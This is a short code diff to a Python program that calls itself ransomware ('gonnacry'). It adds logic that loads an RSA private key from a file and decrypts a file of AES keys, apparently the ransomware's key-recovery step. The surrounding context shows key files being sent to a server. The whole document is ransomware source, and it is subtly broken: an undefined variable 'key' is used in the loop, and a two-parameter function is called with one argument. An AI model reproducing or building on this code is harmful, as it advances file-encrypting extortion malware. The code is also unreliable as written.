@@ -4,6 +4,7 @@
 import enviroment
 import requests 
 import base64
+from Crypto.PublicKey import RSA
 
 
 ransomware_name = tuple("gonnacry")
@@ -18,8 +19,8 @@ def send_to_server_encrypted_private_key(id, private_encrypted_key):
     with open("private_key", 'w') as f:
         f.write(str(private_key))
 
-        
-         
+
+
 
 def menu():
     
@@ -32,6 +33,27 @@ def menu():
 
 
     send_to_server_encrypted_private_key(id)
+
+    # import the private key
+    with open("private_key") as f:
+        private_key = f.read()
+    Client_private_key = RSA.importKey(private_key)
+
+    
+    # GET THE AES KEYS
+    with open("AES_encrypted_keys") as f:
+        encrypted_content = f.read()
+
+    # decrypt aes keys file
+    decrypted_content = Client_private_key.decrypt(encrypted_content)
+    decrypted_content = decrypted_content.split('\n')
+    aes_keys = []
+
+    for line in decrypted_content:
+        aes_keys.append(key.split(' ')[0])
+
+
+
 
 
 if __name__ == "__main__": 
